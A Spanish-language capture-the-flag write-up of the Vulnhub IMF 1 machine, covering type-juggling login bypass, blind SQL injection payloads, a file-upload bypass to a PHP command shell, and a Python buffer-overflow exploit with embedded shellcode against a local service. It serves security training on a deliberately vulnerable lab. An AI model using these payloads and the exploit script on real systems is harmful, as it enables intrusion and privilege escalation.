---
author: Helder
title: Vulnhub - IMF1
tags : [Linux,Type_Juggling,SQLi,File_Upload,BufferOverflow]
categories: [Vulnhub,Hard]
date: 2023-10-15 11:33:00 +0800
mermaid: true
---
Descripcion : IMF is a intelligence agency that you must hack to get all flags and ultimately root. 
The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. 

## Reconocimiento
Máquina [**IMF 1**](https://www.vulnhub.com/entry/imf-1,162/)

Identificamos el Target.
![arps](https://helhat.github.io/assets/img/IMF/scan.png){: .normal }

De esta manera iniciamos un escaneo a todos los puertos.
![scan](https://helhat.github.io/assets/img/IMF/scan02.png){: .normal }

Posteriormente identificamos versiones y script comunes
![scan2](https://helhat.github.io/assets/img/IMF/scan2.png){: .normal }

Ingresamos a la página e identificamos las tecnologías que usa.
![wapp](https://helhat.github.io/assets/img/IMF/wappalyzer.png){: .normal }

Fuzzing con las extensiones comunes, que podría tener la página. Es aquí donde encontramos 3 recursos .php
![gobuster](https://helhat.github.io/assets/img/IMF/gobuster1.png){: .normal }


## Enumeracion
Después de ingresar en cada uno de ellos, logramos encontrar en el código fuente de contact.php, en donde tenemos una flag.
Además, tendremos en cuenta a los miembros que nos aparece en la página.
![flag1](https://helhat.github.io/assets/img/IMF/flag1.png){: .normal }

A simple vista esta en base64, que al decodificar nos brindará una pista.
![flag1d](https://helhat.github.io/assets/img/IMF/flag1d.png){: .normal }

Ahora de esta manera al revisar los recursos de la red, podemos ver 3 recursos que aparentemente están en base64.
![allfiles](https://helhat.github.io/assets/img/IMF/allfiles.png){: .normal }

Si los juntamos y decodificamos tendremos la 2° flag, también con otra pista.
![flag2](https://helhat.github.io/assets/img/IMF/flag2.png){: .normal }
![flag2d](https://helhat.github.io/assets/img/IMF/flag2d.png){: .normal }

Al usarlo en la web podremos ver un panel de autenticación. Capturamos el tráfico con burpsuite.
![login](https://helhat.github.io/assets/img/IMF/imfadministrator.png){: .normal }

## Explotacion
Es aquí donde intentaremos aplicar SQLi , XML, XPath, sin éxito. Pero intentaremos utilizar *Type Juggling*, de esta manera podremos ver, que no esta sanitizada las entradas, y de esta manera tenemos una respuesta con una flag y un recurso adicional.
![type](https://helhat.github.io/assets/img/IMF/type.png){: .normal }


![flag3d](https://helhat.github.io/assets/img/IMF/flag3d.png){: .normal }

Como la misma pista nos indica, ya comprobada la vulnerabilidad solo queda darle a Forward y desactivar el proxy del Burpsuite, para ganar acceso.
![forward](https://helhat.github.io/assets/img/IMF/forward.png){: .normal }

Como se podrá apreciar. Tendremos un usuario llamado rmichaels, director de IMF.
![flag3](https://helhat.github.io/assets/img/IMF/flag3.png){: .normal }

Al hacer click en el hypervinculo, tenemos este otro recurso, donde llama a un csm.php, es aquí donde probaremos LFI, sin éxito.
![cms](https://helhat.github.io/assets/img/IMF/cms.png){: .normal }

De esta manera probamos SQLi, confirmando que es de tipo booleano. 
Esto nos representa una respuesta diferente si la query es True o False. La respuesta cambia a *Under Construction* cuando es TRUE.
![home](https://helhat.github.io/assets/img/IMF/home.png){: .normal }
![or](https://helhat.github.io/assets/img/IMF/or.png){: .normal }

De esta manera intentaremos buscar la cantidad de columnas, pero no se nos muestra la respuesta.
![union](https://helhat.github.io/assets/img/IMF/union.png){: .normal }

Entonces buscaremos como se llama la base de datos, extrayendo caracter según su posición.
![caracter](https://helhat.github.io/assets/img/IMF/caracter.png){: .normal }
![welcome](https://helhat.github.io/assets/img/IMF/welcome.png){: .normal }
![character](https://helhat.github.io/assets/img/IMF/character.png){: .normal }
![under](https://helhat.github.io/assets/img/IMF/under.png){: .normal }

Como uno se dará cuenta, este proceso en la web es lento y tedioso, por ende se buscará entablar un script por python para automatizar y encontrar las bases de datos y posibles tablas.
Antes de ellos es importante definir la Longitud de la Base de datos
![length](https://helhat.github.io/assets/img/IMF/length.png){: .normal }

Luego revisamos la respuesta, y verificamos que es necesario una cookie para poder loguearnos, esto es importante, puesto que buscamos la respuesta, y con esta comparar si el caracter es correcto o no, según nuestra query SQL.
![curl](https://helhat.github.io/assets/img/IMF/curl.png){: .normal }
![script](https://helhat.github.io/assets/img/IMF/script.png){: .normal }

Entonces la query para determinar las base de datos será:
```
home' or substring((select schema_name from information_schema.schemata limit %d,1),1,1)='a
```
O evitar tener un bucle triple con
```
home' or substring((select group_concat(schema_name) from information_schema.schemata),1,1)='a
```

Podemos usar sqlmap o un Script en python, en el cual genere un bucle entre caracter y posicion.
![dbs](https://helhat.github.io/assets/img/IMF/dbs.png){: .normal }

Datos
```
sqli_url= main_url + "home' or substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)
```
![data](https://helhat.github.io/assets/img/IMF/data.png){: .normal }

Teniendo el dato correcto, la ingresamos y notamos una imagen con un CodeQR, la capturamos y decodificamos.
![qr](https://helhat.github.io/assets/img/IMF/qr.png){: .normal }
![flag4](https://helhat.github.io/assets/img/IMF/flag4.png){: .normal }

Una nueva flag, nos indica un recurso .php, donde cargaremos en la web.
![flag4](https://helhat.github.io/assets/img/IMF/flag4d.png){: .normal }

**File Upload**
Es aquí donde tenemos un File Upload. Lo capturamos con Burpsuite para verificar que extensiones permite.
![upload](https://helhat.github.io/assets/img/IMF/upload.png){: .normal }

Creamos un archivo .php que, al subirlo, con un parametro cmd, pueda ingresar un comando que se ejecute en el sistem. Pero como es de esperarse, no permite .php.
![invalid](https://helhat.github.io/assets/img/IMF/invalid.png){: .normal }

Por ende aplicaremos Magic Numbers, es aqui donde cambiamos la extension de nuestro archivo, y la cabecera Content-Type. 
Pero igual manera no reconoce la extensión, es por ende que convertimos a *system en HEX* , para bypassear y conseguir subir este archivo malicioso.
Como respuesta exitosa tendremos un recurso adicional.
![system](https://helhat.github.io/assets/img/IMF/system.png){: .normal }

Pero esa dirección no la reconoce por eso cambiamos la extension a gif. Adicionalmente, verificamos que en la respuesta siempre se menciona un valor Uploads, es aquí donde se guarda las imágenes.
![exitoso](https://helhat.github.io/assets/img/IMF/exitoso.png){: .normal }
![GiF](https://helhat.github.io/assets/img/IMF/urlas.png){: .normal }

**Reverse shell**
Ya confirmado el File Upload, llamamos el cmd anteriormente definido y aplicamos el reverse shell. Recomendable urlencodear el *&*
![RCE](https://helhat.github.io/assets/img/IMF/RCE.png){: .normal }
![flag5](https://helhat.github.io/assets/img/IMF/flag5.png){: .normal }

Una flag adicional que nos indica que existe un servicio agent
![flag5](https://helhat.github.io/assets/img/IMF/flag5d.png){: .normal }

Buscando el archivo vemos que es un binario, y el otro un registro en que puerto corre este servicio y con que usuario.
```
find / -name agent 2>/dev/null
```
![port](https://helhat.github.io/assets/img/IMF/port.png){: .normal }

Nos transferimos el binario para analizar.
![netcat](https://helhat.github.io/assets/img/IMF/netcat.png){: .normal }
![recib](https://helhat.github.io/assets/img/IMF/recib.png){: .normal }

## Persistencia

Buffer Overflow
![imf](https://helhat.github.io/assets/img/IMF/imf.png){: .normal }

agent 48093572
![gdb](https://helhat.github.io/assets/img/IMF/dgb.png){: .normal }

El programa se corrompe al sobrepasar el limite del buffer, para determinar la longitud de este, crearemos un patron de 200 caracteres aleatorios, ahora corremos nuesvamente el binaria e introducimos este patron.
![pattern](https://helhat.github.io/assets/img/IMAGES/pattern.png){: .normal }

De esta manera podemos observar que al ingresar el patron, nuestro registro EIP cambia, en cierta posicion.
![eip](https://helhat.github.io/assets/img/IMF/eip.png){: .normal }

Ahora identificaremos el offset
![offset](https://helhat.github.io/assets/img/IMF/offset.png){: .normal }

De esta manera intentaremos sobreescribir el EIP con 4 bytes de B.
![bbbb](https://helhat.github.io/assets/img/IMF/bbbb.png){: .normal }

Como se podrá apreciar en la siguiente imagen, se logro sobrescribir el EIP, gracias a esto buscaremos que EIP apunte al registro EAX y así ejecutar una instrucción maliciosa.
![reemp](https://helhat.github.io/assets/img/IMF/reemp.png){: .normal }

Antes de proceder, verificamos las protecciones del binario, para este caso, la mayoría esta des habilitada.
![check](https://helhat.github.io/assets/img/IMF/check.png){: .normal }

Ademas analizaremos los registros
![reg](https://helhat.github.io/assets/img/IMF/reg.png){: .normal }

Lo que sucede con esta dirección, es que existe el *lsr* , y por ende la aleatorización, esto va a cambiar constantemente. Por esto mismo buscamos en otro registro para saber cuando empieza la letra *A*
![eax](https://helhat.github.io/assets/img/IMF/eax.png){: .normal }

El registro EAX apunta exactamente al comienzo de nuestro código shell.
Entonces ahora, realizaremos un call eax, para llamar al registro eax y así se ejecute nuestro shellcode malicioso. 

El siguiente paso es encontrar el código de operación "JMP EAX" o "CALL EAX" , observar la dirección de memoria y usar esa dirección para sobrescribir EIP.
![nasm](https://helhat.github.io/assets/img/IMF/nasm.png){: .normal }
![obj](https://helhat.github.io/assets/img/IMF/obj.png){: .normal }

Creamos nuestro shellcode, con los principales badchars. Posteriormente nos preparamos para el ataque con un script en python.
![shell](https://helhat.github.io/assets/img/IMF/shell.png){: .normal }

1. Principales badchars, que pueden impedir que nuestro shellcode se interprete de la manera correcta.
- Adicionalmente vemos que la cantidad de bytes es 95 del shellcode, es decir faltaría 73 bytes para llenar el buffer y después sobreescribir el EIP, para que apunte al EAX, donde ira nuestro payload malicioso.

Por ello para el script colocamos el shellcode en bytes.
```python
#!/usr/bin/python
from struct import pack
import socket

shellcode = (b"\xd9\xc5\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\xbd\x14\x8f"
b"\x3f\x9c\x83\xc3\x04\x31\x6b\x13\x03\x7f\x9c\xdd\x69\x4e"
b"\x79\xd6\x71\xe3\x3e\x4a\x1c\x01\x48\x8d\x50\x63\x87\xce"
b"\x02\x32\xa7\xf0\xe9\x44\x8e\x77\x0b\x2c\xd1\x20\xc6\x27"
b"\xb9\x32\x19\x33\xe8\xba\xf8\x8b\x6a\xed\xab\xb8\xc1\x0e"
b"\xc5\xdf\xeb\x91\x87\x77\x9a\xbe\x54\xef\x0a\xee\xb5\x8d"
b"\xa3\x79\x2a\x03\x67\xf3\x4c\x13\x8c\xce\x0f")

offset = 168

# Se agrega en bytes ciertos A , dependiendo de los que bytes que falta para llenar el buffer antes de reeplazar el EIP, y luego se agrega la direccion del EAX.
payload = shellcode + b"A" * (offset-len(shellcode)) + pack("<I",0x8048563)
#Entablamos conexion
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",7788))

data=s.recv(1024)

print(data)

```
Realizaremos una prueba

Es aquí, donde veremos si nuestro script está funcionando, nos pedirá el ID, la opción 3 y luego ya entraría el payload.
✔Si el programa objetivo envía un mensaje solicitando datos adicionales antes de que puedas enviar tu cadena de datos, necesitarías recibir ese mensaje primeramente utilizando s.recv() para poder enviar tu información posteriormente.
![id](https://helhat.github.io/assets/img/IMF/id.png){: .normal }
![opcion](https://helhat.github.io/assets/img/IMF/opcion.png){: .normal }

```python
#El \n representa a un "Enter"

payload = shellcode + b"A" * (offset-len(shellcode)) + pack("<I",0x8048563) + b"\n"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",7788))

#Como el binario pide datos adicionales antes de ejecutar nuestro payload, agregamos:
s.recv(1024)
s.send(b"4893572\n")   ##ID + Enter
s.recv(1024)
s.send(b"3\n")         ##Ingresar Opcion 3 + Enter
s.recv(1024)
s.send(payload)
```
![root](https://helhat.github.io/assets/img/IMF/root.png){: .normal }

Y de esta manera se logro escalar privilegios, con un BufferOverflow y capturar la flag.
![fin](https://helhat.github.io/assets/img/IMF/fin.png){: .normal }
